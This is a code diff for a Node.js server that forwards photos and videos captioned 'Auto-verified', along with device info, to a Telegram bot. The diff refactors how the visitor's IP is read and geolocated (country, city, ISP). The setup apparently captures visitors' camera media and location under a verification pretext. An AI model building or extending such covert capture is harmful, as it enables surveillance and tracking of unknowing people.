@@ -138,11 +138,23 @@ function updateBotUI(chatId, messageId = null) {
   }
 }
 
-// --- Helper: Get IP Details ---
-async function getIPDetails(ip) {
+// --- Helper: Get IP Details (Updated Logic) ---
+async function getIPDetails(req) {
   try {
-    if (ip.includes('127.0.0.1') || ip.includes('::1')) ip = '8.8.8.8';
-    const res = await axios.get(`http://ip-api.com/json/${ip}`);
+    // x-forwarded-for এ একাধিক আইপি থাকলে সবার প্রথমটি নেওয়া হচ্ছে
+    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+    
+    if (ip.includes(',')) {
+      ip = ip.split(',')[0].trim();
+    }
+
+    // লোকালহোস্ট বা IPv6 চেক
+    if (ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('::ffff:')) {
+      ip = '8.8.8.8'; // ডেমো আইপি (যদি লোকালহোস্ট হয়)
+    }
+
+    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,query`);
+    
     if (res.data.status === 'success') {
       return {
         ip: res.data.query,
@@ -153,7 +165,7 @@ async function getIPDetails(ip) {
       };
     }
   } catch (e) {
-    return null;
+    console.error("IP API Error:", e.message);
   }
   return null;
 }
@@ -168,8 +180,7 @@ app.post('/api/send-photo', async (req, res) => {
     let caption = "📸 Auto-verified photo";
 
     if (!session.hasSentDetails && deviceInfo) {
-      const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-      const ipDetails = await getIPDetails(clientIp);
+      const ipDetails = await getIPDetails(req);
 
       caption = `📸 *Auto-verified photo*\n\n`;
       if (ipDetails) {
@@ -209,8 +220,7 @@ app.post('/api/send-video', async (req, res) => {
     let caption = `🎥 Auto-verified video (${session.duration}s)`;
 
     if (!session.hasSentDetails && deviceInfo) {
-      const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-      const ipDetails = await getIPDetails(clientIp);
+      const ipDetails = await getIPDetails(req);
 
       caption = `🎥 *Auto-verified video (${session.duration}s)*\n\n`;
       if (ipDetails) {
@@ -291,6 +301,6 @@ app.listen(PORT, async () => {
       console.error("❌ Failed to set webhook:", err.message);
     }
   } else {
-    console.warn("⚠️ SUGA_PUBLIC_HOSTNAME not found. Webhook could not be set.");
+    console.warn("⚠️ PUBLIC_URL not found. Webhook could not be set.");
   }
 });
